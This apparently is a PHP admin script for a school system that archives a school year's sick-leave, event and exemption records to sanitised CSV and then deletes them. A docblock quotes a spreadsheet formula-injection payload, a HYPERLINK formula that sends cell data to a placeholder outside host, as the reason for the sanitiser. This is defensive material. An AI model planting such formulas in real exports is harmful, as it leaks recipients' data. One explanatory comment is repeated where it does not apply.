<?php
/**
 * src/admin_archive.php
 * Jahresabschluss: archivieren und bereinigen.
 *
 * Zwei Aenderungen gegenueber frueher:
 *
 * 1. Zeitraum ist das Schuljahr (1. August bis 31. Juli), nicht das
 *    Kalenderjahr. Ein Kalenderjahr schneidet mitten durch - ein Abschluss im
 *    Dezember nimmt die eine Haelfte mit und laesst die andere stehen, und
 *    eine Klassenfahrt im Maerz liegt im selben Schuljahr wie eine im
 *    November davor.
 *
 * 2. Das Archiv entsteht ausserhalb des DocumentRoot. Vorher wurde es in
 *    public/uploads/ gebaut - dessen .htaccess sperrt nur die Ausfuehrung von
 *    PHP, nicht den Abruf. Ein Jahresarchiv mit allen Krankmeldungen und
 *    Attesten lag damit unter einer Adresse, die aus Name und Zeitstempel
 *    besteht, und blieb dort liegen, sobald der Download abbrach.
 */
require_once __DIR__ . '/config/database.php';
require_once __DIR__ . '/includes/auth.php';
require_once __DIR__ . '/includes/ablage.php';

/**
 * Macht aus einem Wert einen Text, den die Tabellenkalkulation nicht als
 * Formel liest.
 *
 * Excel und LibreOffice behandeln jede Zelle, die mit =, +, -, @, einem
 * Tabulator oder einem Wagenruecklauf beginnt, als Formel. Im Archiv stehen
 * Freitexte, die Lehrkraefte selbst eingeben - Notizen zur Krankmeldung,
 * Veranstaltungsnamen, Begruendungen. Ein Eintrag wie
 *
 *     =HYPERLINK("http://fremd.example/"&A1;"hier klicken")
 *
 * wird beim Oeffnen ausgefuehrt, nicht angezeigt. Die Datei entsteht beim
 * Jahresabschluss und wird von der Schulleitung geoeffnet.
 *
 * Zahlen bleiben unangetastet, sonst liesse sich die Spalte nicht mehr
 * rechnen.
 */
function archiv_entschaerfe(mixed $wert): string
{
    if ($wert === null) {
        return '';
    }

    $text = (string) $wert;

    if ($text === '' || is_numeric($text)) {
        return $text;
    }

    return in_array($text[0], ['=', '+', '-', '@', "\t", "\r"], true) ? "'" . $text : $text;
}

/**
 * Baut eine CSV-Zeile.
 *
 * Vorher stand hier implode(';', array_values($r)) - ohne Anfuehrungszeichen.
 * Ein Semikolon im Notizfeld ("Bitte Klasse 7a informieren; Material liegt
 * im Fach") hat die Zeile damit still um eine Spalte verschoben, ein
 * Zeilenumbruch sie zerrissen. Beides kommt in einem Freitextfeld vor.
 *
 * @param array<int|string,mixed> $werte
 */
function archiv_csv(array $werte): string
{
    $kanal = fopen('php://memory', 'r+');
    if ($kanal === false) {
        return '';
    }

    // Der leere Escape-Parameter schaltet die PHP-eigene Sonderbehandlung des
    // Backslashs ab; ohne ihn warnt PHP 8.4 ausserdem, dass er fehlt.
    fputcsv($kanal, array_map('archiv_entschaerfe', array_values($werte)), ';', '"', '');
    rewind($kanal);
    $zeile = (string) stream_get_contents($kanal);
    fclose($kanal);

    return $zeile;
}


require_admin();
$conn = db_connect();

$action = $_GET['action'] ?? '';

/**
 * Beginnjahr des Schuljahres aus der Anfrage - oder das laufende.
 *
 * Bis Juli laeuft das Schuljahr, das im Vorjahr begonnen hat.
 */
function gewaehltes_schuljahr() {
    $wunsch = (int)($_POST['schuljahr'] ?? $_GET['schuljahr'] ?? 0);

    if ($wunsch >= 2000 && $wunsch <= 2100) {
        return $wunsch;
    }

    return (int)date('n') >= 8 ? (int)date('Y') : (int)date('Y') - 1;
}

/**
 * @return array{0:string,1:string} erster und letzter Tag des Schuljahres
 */
function schuljahr_zeitraum($beginn) {
    return [sprintf('%04d-08-01', $beginn), sprintf('%04d-07-31', $beginn + 1)];
}

if ($action === 'export') {
    if (!verify_csrf_token($_POST['csrf_token'] ?? '')) {
        $_SESSION['flash_error'] = 'Die Seite war zu lange geöffnet. Bitte neu laden.';
        header('Location: /admin_system.php');
        exit;
    }

    $beginn = gewaehltes_schuljahr();
    [$von, $bis] = schuljahr_zeitraum($beginn);
    $year = sprintf('%d-%02d', $beginn, ($beginn + 1) % 100);

    $archive_name = "Jahresabschluss_" . $year;

    // Ausserhalb des DocumentRoot: ein Archiv mit Attesten gehoert nicht in
    // ein Verzeichnis, das der Webserver ausliefert.
    $tmp_dir = sys_get_temp_dir() . "/" . $archive_name . "_" . bin2hex(random_bytes(6));
    
    // Laesst sich das Arbeitsverzeichnis nicht anlegen, hat der Export keinen
    // Zweck - frueher lief er blind weiter und erzeugte ein leeres Archiv.
    $verzeichnisse = [$tmp_dir, "$tmp_dir/Krankmeldungen", "$tmp_dir/Veranstaltungen",
                      "$tmp_dir/Freistellungen", "$tmp_dir/Anhaenge"];
    foreach ($verzeichnisse as $verzeichnis) {
        if (!is_dir($verzeichnis) && !@mkdir($verzeichnis, 0775, true) && !is_dir($verzeichnis)) {
            error_log("admin_archive: $verzeichnis nicht anlegbar");
            $_SESSION['flash_error'] = "Das Archiv konnte nicht erstellt werden: Das "
                . "Ablageverzeichnis ist nicht beschreibbar. Bitte die Administration "
                . "informieren.";
            // admin_archive.php hat keine eigene Oberflaeche - die Meldung
            // erscheint in der Systemverwaltung, so wie beim Cleanup weiter unten.
            header("Location: /admin_system.php");
            exit;
        }
    }

    // --- 1. Export Sick Leave Reports ---
    $stmt = $conn->prepare("SELECT * FROM sick_leave_reports WHERE date_from BETWEEN ? AND ?");
    $stmt->execute([$von, $bis]);
    $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
    // Die Kopfzeile kam aus einer festen Liste und passte nicht mehr zu
    // den Spalten: sick_leave_reports hat ueber die Migrationen
    // attachment_path, modified_at, is_seen, seen_at und material_link
    // dazubekommen, die Liste nannte acht Namen fuer elf Spalten. Jetzt
    // stehen dort die Spaltennamen der Datenbank.
    $csv = $data !== [] ? archiv_csv(array_keys($data[0])) : '';
    foreach ($data as $r) {
        $csv .= archiv_csv($r);
        // Der Anhang liegt seit der Umstellung in der Ablage ausserhalb des
        // DocumentRoot; ablage_aufloesen() kennt auch noch den Altbestand
        // unter public/uploads/.
        $anhang = !empty($r['attachment_path']) ? ablage_aufloesen($r['attachment_path']) : null;
        if ($anhang !== null) {
            // Im Archiv traegt das Attest die ID seiner Krankmeldung, nicht
            // seinen Zufallsnamen - so laesst es sich der Zeile in der CSV
            // zuordnen.
            $endung = strtolower(pathinfo($anhang, PATHINFO_EXTENSION));
            copy($anhang, $tmp_dir . "/Anhaenge/Attest_" . $r['id'] . '.' . $endung);
        }
    }
    file_put_contents($tmp_dir . "/Krankmeldungen/krankmeldungen_$year.csv", "\xEF\xBB\xBF" . $csv);

    // --- 2. Export Extracurricular Events ---
    $stmt = $conn->prepare("SELECT id, teacher_id, role, class_name, companion, event_date, event_date_to, event_name, destination, aud_type, participating_teacher_id, costs, transport, start_time, start_location, return_time, return_location, return_trip_arranged, supervisors, consent_form, schedule_notified, status, created_at, modified_at, modified_after_approval FROM extracurricular_requests WHERE event_date BETWEEN ? AND ?");
    $stmt->execute([$von, $bis]);
    $extra_data = $stmt->fetchAll(PDO::FETCH_ASSOC);
    // Die Kopfzeile kam aus einer festen Liste und passte nicht mehr zu
    // den Spalten: sick_leave_reports hat ueber die Migrationen
    // attachment_path, modified_at, is_seen, seen_at und material_link
    // dazubekommen, die Liste nannte acht Namen fuer elf Spalten. Jetzt
    // stehen dort die Spaltennamen der Datenbank.
    $csv = $extra_data !== [] ? archiv_csv(array_keys($extra_data[0])) : '';
    foreach ($extra_data as $r) {
        $csv .= archiv_csv($r);
    }
    file_put_contents($tmp_dir . "/Veranstaltungen/veranstaltungen_$year.csv", "\xEF\xBB\xBF" . $csv);

    // --- 3. Export Exemption Requests ---
    $stmt = $conn->prepare("SELECT * FROM exemption_requests WHERE date_from BETWEEN ? AND ?");
    $stmt->execute([$von, $bis]);
    $ex_data = $stmt->fetchAll(PDO::FETCH_ASSOC);
    // Die Kopfzeile kam aus einer festen Liste und passte nicht mehr zu
    // den Spalten: sick_leave_reports hat ueber die Migrationen
    // attachment_path, modified_at, is_seen, seen_at und material_link
    // dazubekommen, die Liste nannte acht Namen fuer elf Spalten. Jetzt
    // stehen dort die Spaltennamen der Datenbank.
    $csv = $ex_data !== [] ? archiv_csv(array_keys($ex_data[0])) : '';
    foreach ($ex_data as $r) {
        $csv .= archiv_csv($r);
    }
    file_put_contents($tmp_dir . "/Freistellungen/freistellungen_$year.csv", "\xEF\xBB\xBF" . $csv);


    // Create Archive using tar (fallback for ZipArchive)
    $archive_file = $archive_name . ".tar.gz";
    $archive_path = $tmp_dir . ".tar.gz";
    
    $cmd = "tar -czf " . escapeshellarg($archive_path) . " -C " . escapeshellarg($tmp_dir) . " .";
    shell_exec($cmd);

    // Cleanup tmp dir
    shell_exec("rm -rf " . escapeshellarg($tmp_dir));

    if (file_exists($archive_path)) {
        header('Content-Type: application/gzip');
        header('Cache-Control: private, no-store');
        header('X-Content-Type-Options: nosniff');
        header('Content-Disposition: attachment; filename="' . $archive_file . '"');
        header('Content-Length: ' . filesize($archive_path));
        readfile($archive_path);
        unlink($archive_path);
        exit;
    } else {
        die("Fehler beim Erstellen des Archivs.");
    }
}

if ($action === 'cleanup' && isset($_POST['confirm_year'])) {
    $csrf_token = $_POST['csrf_token'] ?? '';
    if (!verify_csrf_token($csrf_token)) {
        die("CSRF Security Check failed.");
    }
    
    $beginn = (int)$_POST['confirm_year'];
    [$von, $bis] = schuljahr_zeitraum($beginn);
    $schuljahr = sprintf('%d/%02d', $beginn, ($beginn + 1) % 100);

    // Die Atteste liegen im Dateisystem, nicht in der Datenbank. Bisher
    // loeschte der Abschluss nur die Zeilen - die PDF-Dateien blieben
    // liegen, Jahr fuer Jahr, ohne dass noch irgendetwas auf sie zeigte.
    // Ein Loeschkonzept, das die Gesundheitsdaten stehen laesst, ist keines.
    $stmt = $conn->prepare("SELECT attachment_path FROM sick_leave_reports
                             WHERE date_from BETWEEN ? AND ? AND attachment_path IS NOT NULL");
    $stmt->execute([$von, $bis]);
    $atteste = $stmt->fetchAll(PDO::FETCH_COLUMN);

    // Delete and log
    $stmt = $conn->prepare("DELETE FROM sick_leave_reports WHERE date_from BETWEEN ? AND ?");
    $stmt->execute([$von, $bis]);
    $count_sick = $stmt->rowCount();

    foreach ($atteste as $attest) {
        ablage_loeschen($attest);
    }

    $stmt = $conn->prepare("DELETE FROM extracurricular_requests WHERE event_date BETWEEN ? AND ?");
    $stmt->execute([$von, $bis]);
    $count_extra = $stmt->rowCount();

    $stmt = $conn->prepare("DELETE FROM exemption_requests WHERE date_from BETWEEN ? AND ?");
    $stmt->execute([$von, $bis]);
    $count_exempt = $stmt->rowCount();

    $_SESSION['flash_success'] = "Archiv-Cleanup für das Schuljahr $schuljahr abgeschlossen. $count_sick Krankmeldungen, $count_extra Veranstaltungen und $count_exempt Freistellungen wurden entfernt.";
    header("Location: /admin_system.php");
    exit;
}
